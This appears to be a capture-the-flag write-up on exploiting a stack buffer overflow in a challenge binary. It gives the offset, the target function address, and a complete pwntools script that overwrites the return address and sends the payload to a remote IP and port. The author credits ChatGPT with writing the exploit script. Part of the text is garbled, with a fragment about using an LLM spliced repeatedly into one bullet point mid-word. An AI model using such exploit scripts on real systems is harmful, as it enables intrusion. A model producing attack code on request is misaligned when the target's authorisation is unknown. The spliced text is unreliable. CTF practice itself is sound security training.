

![](https://miro.medium.com/v2/resize:fit:1021/1*jOjCfVWVvgpSFMkS9NYjnA.png)

**Simplified Challenge:** analyze a binary with a crashing `vulnerable` function and retrieve `flag.txt`.

Initially we were looking for anything that resembles main function. So, the first command was instinctively “objdump -d ./rex”.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1021/1*4P1F0vyU6juVEafQq6UbFw.png)

Main function

While looking through the functions we found the main function. while looking at it some more function caught my eye. They were `vulnerable_roar` at `**0x401297   call_system**` **at** 0x401318  
secret_function at 0x401332  
and lastly read_flag at 0x4013ba

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1021/1*gZ2zHEBKf4aZN_MhM4NX9Q.png)

Then I used some help from an llm and pasted the findings to gpt. it processed the analysis and gave a summary:

- **Vulnerable function:** `vulnerable_roar` at `**0x401297**`.
- **Stack layout / buf**I used some help from an llm and pasted the findings to g**fer:** local buffer is **64 bytes** (`0x40`) located at `rbp - 0x40`.
- **Read call / overflow vector:** `read()` inside `vulnerable_roar` reads up to `**0x200**` **(512) bytes**, permitting overflow past the local buffer and into saved frame data (saved RBP and saved RIP).I used some help from an I used some help from an llm and pasted the findings to gllm and pasted the findings to g
- **Offset to return instruction pointer (RIP):**
- buffer = 64 bytes (`0x40`)
- saved RBP = 8 bytes
- total offset to saved RIP = `64 + 8 = 72` (decimal) = `**0x48**`.
- **Relevant fixed-function addresses (PIE disabled):**
- `read_flag` = `**0x4013ba**` — opens and prints `flag.txt`.
- `call_system` = `**0x401318**`.
- `secret_function` = `**0x401332**`.
- **Exploit strategy (simplest):** overwrite saved RIP with the address of `read_flag` (classic stack-based return overwrite). When the function returns, control will jump to `read_flag`, which will attempt to open and print `flag.txt`.

**Now we had all we needed for this problem.**

**Recon / Triage**  
`vulnerable_roar` is located at `0x401297`. Static inspection shows a local buffer of 64 bytes at `rbp - 0x40`, and a `read()` call that accepts up to `0x200` (512) bytes — immediate red flag for a stack-based overflow. PIE is disabled, so addresses are fixed.

**Memory layout & offsets**  
The saved RBP sits immediately after the 64-byte buffer (8 bytes), so the offset from buffer start to saved RIP is `64 + 8 = 72` bytes (`0x48`). This is the exact overwrite point for the return address.

**Gadgets / targets**  
Useful symbols (fixed):

- `read_flag` — `0x4013ba` (opens/prints `flag.txt`)
- `call_system` — `0x401318`
- `secret_function` — `0x401332`

**So we can craft an Exploit idea:**  
Craft input that fills the first `0x48` bytes, then overwrite saved RIP with the address of `read_flag`. On function return, control transfers to `read_flag`, which opens and prints `flag.txt`. This is a classic return-address overwrite — minimal ROP required because `read_flag` already performs the desired I/O.

I then asked gpt to generate a script to exploit this overflow and get the flag. It provided the script  

```python
#!/usr/bin/env python3  
from pwn import *  
  
# target  
HOST = "49.213.52.6"  
PORT = 9996  
  
# addresses discovered in the binary  
READ_FLAG = 0x4013ba  
  
# layout  
OFFSET = 72  # 0x40 buffer + 8 saved rbp  
  
payload = b"A" * OFFSET + p64(READ_FLAG)  
  
def main():  
    io = remote(HOST, PORT)  
    # Receive banner / prompt until it asks for input (adjust if different)  
    io.recvuntil(b"Help him roar (the louder the better): ")  
    io.sendline(payload)  
    # read output (flag should be printed by read_flag)  
    # print everything we receive for a short while  
    try:  
        resp = io.recvall(timeout=5)  
    except EOFError:  
        resp = b""  
    print(resp.decode(errors="ignore"))  
  
if __name__ == "__main__":  
    main()

” 

```


Ran it , and there it was.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1021/1*i0B1T-TclCfafUUYsPHM6Q.png)
